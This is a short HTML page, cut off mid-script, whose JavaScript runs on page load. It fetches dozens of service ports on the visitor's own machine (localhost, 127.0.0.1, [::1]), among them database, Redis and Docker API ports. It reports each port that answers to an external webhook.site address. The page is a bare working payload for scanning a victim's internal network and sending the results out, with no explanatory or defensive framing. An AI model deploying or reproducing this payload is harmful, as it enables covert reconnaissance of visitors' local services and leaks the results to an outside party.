<!DOCTYPE html>
<html><body><script>
var wh='https://webhook.site/147c31f4-eca8-4ea7-a98e-d285652981b8';
function beacon(k){fetch(wh+'?p='+encodeURIComponent(k),{mode:'no-cors'});}
var hosts=['127.0.0.1','localhost','[::1]'];
var ports=[80,443,3000,3001,4000,5000,6379,8000,8001,8080,8081,8082,8443,9000,9090,1323,2375,5432,3306,27017,11211,9200,8500,15672];
var pending=0;
hosts.forEach(function(h){ports.forEach(function(p){
  pending++;
  var proto = (p===443||p===8443) ? 'https' : 'http';
  fetch(proto+'://'+h+':'+p+'/',{mode:'no-cors'})
    .then(function(){beacon('OPEN_'+h+'_'+p);pending--;})
